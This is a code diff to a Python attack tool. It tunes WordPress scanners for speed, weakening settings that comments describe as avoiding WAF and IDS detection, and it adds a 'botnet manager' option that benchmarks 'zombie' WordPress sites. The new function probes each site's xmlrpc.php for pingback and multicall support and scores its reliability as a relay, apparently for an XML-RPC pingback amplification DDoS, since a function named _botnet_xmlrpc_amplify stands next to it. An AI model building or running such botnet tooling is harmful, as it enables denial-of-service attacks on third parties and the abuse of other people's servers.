@@ -26,6 +26,8 @@ from urllib.parse import urlparse, urljoin
 
 try:
     import requests
+    from urllib3.exceptions import InsecureRequestWarning
+    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 except ImportError:
     print("[!] 'requests' is required. Install with: pip install requests")
     sys.exit(1)
@@ -4399,7 +4401,7 @@ def _cms_scan_single_inner(url, batch_mode, session):
         path, desc = path_info
         try:
             # Per-request jitter to break timing correlation
-            time.sleep(random.uniform(0.2, 1.2))
+            time.sleep(random.uniform(0.05, 0.3))
             test_url = f"{url}{path}"
             # Session auto-rotates UA/headers via patched send
             resp = session.get(test_url, timeout=6, allow_redirects=False, stream=True)
@@ -4412,8 +4414,8 @@ def _cms_scan_single_inner(url, batch_mode, session):
         except Exception:
             return path, desc, 0, 0, ""
 
-    # Reduced concurrency to lower WAF/IDS burst signature
-    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as pool:
+    # Moderate concurrency — balanced speed vs WAF detection
+    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
         futures = [pool.submit(check_path, p) for p in paths]
         try:
             for future in concurrent.futures.as_completed(futures, timeout=90):
@@ -5755,7 +5757,12 @@ def wp_plugin_theme_enum():
     def check_plugin(slug):
         readme_url = f"{url}/wp-content/plugins/{slug}/readme.txt"
         try:
-            r = session.get(readme_url, timeout=6, allow_redirects=False)
+            # Quick HEAD check first to avoid downloading missing files
+            h = session.head(readme_url, timeout=4, allow_redirects=False)
+            if h.status_code != 200:
+                return slug, None, False
+            # Only GET if HEAD confirmed existence
+            r = session.get(readme_url, timeout=5, allow_redirects=False)
             if r.status_code == 200 and len(r.text) > 50:
                 version = "unknown"
                 for line in r.text.splitlines()[:30]:
@@ -5767,7 +5774,7 @@ def wp_plugin_theme_enum():
             pass
         return slug, None, False
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as pool:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as pool:
         futures = {pool.submit(check_plugin, s): s for s in WP_COMMON_PLUGINS}
         for future in concurrent.futures.as_completed(futures):
             slug, version, found = future.result()
@@ -5780,70 +5787,6 @@ def wp_plugin_theme_enum():
                 found_plugins.append((slug, version))
 
     # ── Theme enumeration ──
-    themes = list(dict.fromkeys([
-        "twentytwentyfive", "twentytwentyfour", "twentytwentythree", "twentytwentytwo",
-        "twentytwentyone", "twentytwenty", "twentynineteen", "twentyseventeen",
-        "twentysixteen", "twentyfifteen", "twentyfourteen", "twentythirteen",
-        "astra", "flavor", "flavstart", "flavor",
-        "flavor", "flavor", "flavstart",
-    ]))
-
-    themes = list(dict.fromkeys([
-        "twentytwentyfive", "twentytwentyfour", "twentytwentythree", "twentytwentytwo",
-        "twentytwentyone", "twentytwenty", "twentynineteen", "twentyseventeen",
-        "twentysixteen", "twentyfifteen", "twentyfourteen", "twentythirteen",
-        "astra", "flavor", "flavstart",
-        "oceanwp", "generatepress", "flavstart",
-        "flavor",
-    ]))
-
-    themes = list(dict.fromkeys([
-        "twentytwentyfive", "twentytwentyfour", "twentytwentythree", "twentytwentytwo",
-        "twentytwentyone", "twentytwenty", "twentynineteen", "twentyseventeen",
-        "twentysixteen", "twentyfifteen", "twentyfourteen", "twentythirteen",
-        "astra", "flavor", "flavstart",
-        "oceanwp", "generatepress",
-        "neve", "flavor",
-        "flavor",
-    ]))
-
-    themes = list(dict.fromkeys([
-        "twentytwentyfive", "twentytwentyfour", "twentytwentythree",
-        "twentytwentytwo", "twentytwentyone", "twentytwenty",
-        "twentynineteen", "twentyseventeen", "twentysixteen",
-        "twentyfifteen", "twentyfourteen", "twentythirteen",
-        "astra", "flavor", "flavor",
-        "oceanwp", "generatepress",
-        "neve", "flavor",
-    ]))
-
-    themes = list(dict.fromkeys([
-        "twentytwentyfive", "twentytwentyfour", "twentytwentythree",
-        "twentytwentytwo", "twentytwentyone", "twentytwenty",
-        "twentynineteen", "twentyseventeen", "twentysixteen",
-        "twentyfifteen", "twentyfourteen", "twentythirteen",
-        "astra", "flavstart", "flavor", "flavstart",
-        "oceanwp", "generatepress",
-        "neve",
-    ]))
-
-    themes = list(dict.fromkeys([
-        "twentytwentyfive", "twentytwentyfour", "twentytwentythree",
-        "twentytwentytwo", "twentytwentyone", "twentytwenty",
-        "twentynineteen", "twentyseventeen", "twentysixteen",
-        "twentyfifteen", "twentyfourteen", "twentythirteen",
-        "astra", "oceanwp", "generatepress", "neve",
-        "flavor",
-    ]))
-
-    themes = list(dict.fromkeys([
-        "twentytwentyfive", "twentytwentyfour", "twentytwentythree",
-        "twentytwentytwo", "twentytwentyone", "twentytwenty",
-        "twentynineteen", "twentyseventeen", "twentysixteen",
-        "twentyfifteen", "twentyfourteen", "twentythirteen",
-        "astra", "oceanwp", "generatepress", "neve",
-    ]))
-
     WP_ENUM_THEMES = [
         "twentytwentyfive", "twentytwentyfour", "twentytwentythree",
         "twentytwentytwo", "twentytwentyone", "twentytwenty",
@@ -5859,7 +5802,11 @@ def wp_plugin_theme_enum():
     def check_theme(slug):
         css_url = f"{url}/wp-content/themes/{slug}/style.css"
         try:
-            r = session.get(css_url, timeout=6, allow_redirects=False)
+            # Quick HEAD check first
+            h = session.head(css_url, timeout=4, allow_redirects=False)
+            if h.status_code != 200:
+                return slug, None, False
+            r = session.get(css_url, timeout=5, allow_redirects=False)
             if r.status_code == 200 and len(r.text) > 50:
                 version = "unknown"
                 for line in r.text.splitlines()[:30]:
@@ -5871,7 +5818,7 @@ def wp_plugin_theme_enum():
             pass
         return slug, None, False
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as pool:
         futures = {pool.submit(check_theme, s): s for s in WP_ENUM_THEMES}
         for future in concurrent.futures.as_completed(futures):
             slug, version, found = future.result()
@@ -8026,6 +7973,7 @@ def botnet_manager():
         print(f"    {C}2.{RST} Add zombie manually")
         print(f"    {C}3.{RST} Remove zombie")
         print(f"    {C}4.{RST} Clear all zombies")
+        print(f"    {C}5.{RST} Benchmark relay reliability & power")
         print(f"    {C}0.{RST} Back to main menu")
 
         choice = input(f"\n  {Y}Select >{RST} ").strip()
@@ -8094,8 +8042,226 @@ def botnet_manager():
                 zombies = []
                 _botnet_db_save(zombies)
                 print(f"  {G}[+]{RST} All zombies cleared.")
+        elif choice == "5":
+            if not zombies:
+                print_err("No zombies in DB to benchmark.")
+                continue
+            _botnet_relay_benchmark(zombies)
         else:
             print_err("Invalid option.")
+
+
+def _botnet_relay_benchmark(zombies):
+    """Benchmark relay reliability and power: connectivity, XML-RPC status, response time, throughput."""
+    print(f"\n  {Y}── Relay Benchmark ──{RST}")
+    print(f"  {W}Test connectivity, XML-RPC availability, response time, and throughput.{RST}\n")
+
+    print(f"  {Y}Select relays to benchmark:{RST}")
+    print(f"    {C}1.{RST} Single relay")
+    print(f"    {C}2.{RST} Range of relays")
+    print(f"    {C}3.{RST} All relays")
+    sel = input(f"\n  {Y}Select >{RST} ").strip()
+
+    if sel == "1":
+        for i, z in enumerate(zombies, 1):
+            print(f"  {C}{i:>3}.{RST} {W}{z['url']}{RST}")
+        idx = input(f"\n  {Y}Relay number:{RST} ").strip()
+        try:
+            idx = int(idx) - 1
+            if not (0 <= idx < len(zombies)):
+                print_err("Invalid number.")
+                return
+            targets = [zombies[idx]]
+        except ValueError:
+            print_err("Enter a valid number.")
+            return
+    elif sel == "2":
+        for i, z in enumerate(zombies, 1):
+            print(f"  {C}{i:>3}.{RST} {W}{z['url']}{RST}")
+        range_s = input(f"\n  {Y}Range (e.g. 1-5):{RST} ").strip()
+        try:
+            parts = range_s.split("-")
+            start = int(parts[0]) - 1
+            end = int(parts[1])
+            if start < 0 or end > len(zombies) or start >= end:
+                print_err("Invalid range.")
+                return
+            targets = zombies[start:end]
+        except (ValueError, IndexError):
+            print_err("Invalid range format. Use: start-end (e.g. 1-5)")
+            return
+    elif sel == "3":
+        targets = list(zombies)
+    else:
+        print_err("Invalid option.")
+        return
+
+    burst_n = input(f"  {Y}Burst requests per relay (1-50) [10]:{RST} ").strip() or "10"
+    try:
+        burst_n = min(50, max(1, int(burst_n)))
+    except ValueError:
+        burst_n = 10
+
+    print(f"\n  {Y}Benchmarking {len(targets)} relay(s) with {burst_n} burst requests each...{RST}\n")
+
+    results = []
+    _print_lock = threading.Lock()
+
+    def _benchmark_single_relay(z):
+        relay_url = z["url"]
+        xmlrpc_url = relay_url.rstrip("/") + "/xmlrpc.php"
+        domain = urlparse(relay_url).netloc
+        result = {
+            "url": relay_url,
+            "domain": domain,
+            "reachable": False,
+            "xmlrpc_active": False,
+            "has_pingback": False,
+            "has_multicall": False,
+            "latency_ms": None,
+            "burst_ok": 0,
+            "burst_fail": 0,
+            "burst_avg_ms": None,
+            "grade": "F",
+        }
+
+        with _print_lock:
+            sys.stdout.write(f"  {Y}[~]{RST} Testing {W}{domain}{RST} ...\n")
+            sys.stdout.flush()
+
+        sess = requests.Session()
+        sess.headers.update({"User-Agent": random.choice(USER_AGENTS)})
+        sess.verify = False
+
+        # 1) Connectivity + latency
+        try:
+            t0 = time.time()
+            resp = sess.get(relay_url, timeout=8, allow_redirects=True)
+            latency = (time.time() - t0) * 1000
+            result["reachable"] = resp.status_code < 500
+            result["latency_ms"] = round(latency, 1)
+        except Exception:
+            result["reachable"] = False
+            with _print_lock:
+                print(f"  {R}[✗]{RST} {domain} — OFFLINE")
+            return result
+
+        # 2) XML-RPC active + method check
+        list_payload = (
+            '<?xml version="1.0"?>'
+            '<methodCall><methodName>system.listMethods</methodName></methodCall>'
+        )
+        try:
+            t0 = time.time()
+            resp = sess.post(xmlrpc_url, data=list_payload,
+                             headers={"Content-Type": "text/xml"}, timeout=8)
+            xmlrpc_latency = (time.time() - t0) * 1000
+            if resp.status_code == 200 and "methodResponse" in resp.text:
+                result["xmlrpc_active"] = True
+                methods = re.findall(r"<string>(.*?)</string>", resp.text)
+                result["has_pingback"] = "pingback.ping" in methods
+                result["has_multicall"] = "system.multicall" in methods
+            result["latency_ms"] = round(xmlrpc_latency, 1)
+        except Exception:
+            result["xmlrpc_active"] = False
+
+        # 3) Burst throughput test (only if xmlrpc is active)
+        if result["xmlrpc_active"]:
+            burst_times = []
+            for _ in range(burst_n):
+                try:
+                    t0 = time.time()
+                    resp = sess.post(
+                        xmlrpc_url,
+                        data=list_payload,
+                        headers={"Content-Type": "text/xml"},
+                        timeout=8,
+                    )
+                    elapsed = (time.time() - t0) * 1000
+                    if resp.status_code == 200 and "methodResponse" in resp.text:
+                        result["burst_ok"] += 1
+                        burst_times.append(elapsed)
+                    else:
+                        result["burst_fail"] += 1
+                except Exception:
+                    result["burst_fail"] += 1
+            if burst_times:
+                result["burst_avg_ms"] = round(sum(burst_times) / len(burst_times), 1)
+
+        sess.close()
+
+        # 4) Grade
+        if not result["reachable"]:
+            result["grade"] = "F"
+        elif not result["xmlrpc_active"]:
+            result["grade"] = "E"
+        elif not (result["has_pingback"] and result["has_multicall"]):
+            result["grade"] = "D"
+        else:
+            success_rate = result["burst_ok"] / burst_n if burst_n > 0 else 0
+            avg = result["burst_avg_ms"] or 99999
+            if success_rate >= 0.9 and avg < 500:
+                result["grade"] = "A"
+            elif success_rate >= 0.7 and avg < 1500:
+                result["grade"] = "B"
+            else:
+                result["grade"] = "C"
+
+        grade_color = {
+            "A": G, "B": C, "C": Y, "D": R, "E": R, "F": R,
+        }.get(result["grade"], W)
+        with _print_lock:
+            print(f"  {grade_color}[{result['grade']}]{RST} {domain}")
+        return result
+
+    # Parallel relay benchmarking — up to 8 relays tested concurrently
+    with concurrent.futures.ThreadPoolExecutor(max_workers=min(8, len(targets))) as pool:
+        futures = [pool.submit(_benchmark_single_relay, z) for z in targets]
+        for future in concurrent.futures.as_completed(futures):
+            try:
+                results.append(future.result())
+            except Exception:
+                pass
+
+    # ── Summary table ──
+    print(f"\n  {Y}{'═' * 74}{RST}")
+    print(f"  {Y}  RELAY BENCHMARK RESULTS{RST}")
+    print(f"  {Y}{'═' * 74}{RST}")
+    print(f"  {W}{'Relay':<30} {'Grade':>5} {'Latency':>9} {'XML-RPC':>7} {'PB':>3} {'MC':>3} {'Burst':>12}{RST}")
+    print(f"  {Y}{'─' * 74}{RST}")
+
+    grade_colors = {"A": G, "B": C, "C": Y, "D": R, "E": R, "F": R}
+    for r in results:
+        gc = grade_colors.get(r["grade"], W)
+        lat = f"{r['latency_ms']}ms" if r["latency_ms"] is not None else "—"
+        xmlrpc = f"{G}yes{RST}" if r["xmlrpc_active"] else f"{R}no{RST}"
+        pb = f"{G}✓{RST}" if r["has_pingback"] else f"{R}✗{RST}"
+        mc = f"{G}✓{RST}" if r["has_multicall"] else f"{R}✗{RST}"
+        if r["burst_avg_ms"] is not None:
+            burst = f"{r['burst_ok']}/{burst_n} {r['burst_avg_ms']}ms"
+        elif r["reachable"]:
+            burst = "skipped"
+        else:
+            burst = "—"
+        print(f"  {W}{r['domain']:<30}{RST} {gc}{r['grade']:>5}{RST} {lat:>9} {xmlrpc:>16} {pb:>12} {mc:>12} {burst:>12}")
+
+    print(f"  {Y}{'─' * 74}{RST}")
+
+    # Legend
+    print(f"\n  {W}Grades:{RST}")
+    print(f"    {G}A{RST} = Excellent (fast, reliable, all vectors)")
+    print(f"    {C}B{RST} = Good (decent speed, mostly reliable)")
+    print(f"    {Y}C{RST} = Usable (slow or some failures)")
+    print(f"    {R}D{RST} = Degraded (XML-RPC active but missing vectors)")
+    print(f"    {R}E{RST} = Broken (site up but XML-RPC dead)")
+    print(f"    {R}F{RST} = Offline (unreachable)")
+
+    # Recommendations
+    dead = [r for r in results if r["grade"] in ("E", "F")]
+    if dead:
+        print(f"\n  {Y}[!]{RST} {len(dead)} relay(s) are broken/offline and should be removed:")
+        for r in dead:
+            print(f"      {R}►{RST} {r['url']}")
 
 
 def _botnet_xmlrpc_amplify(relays):
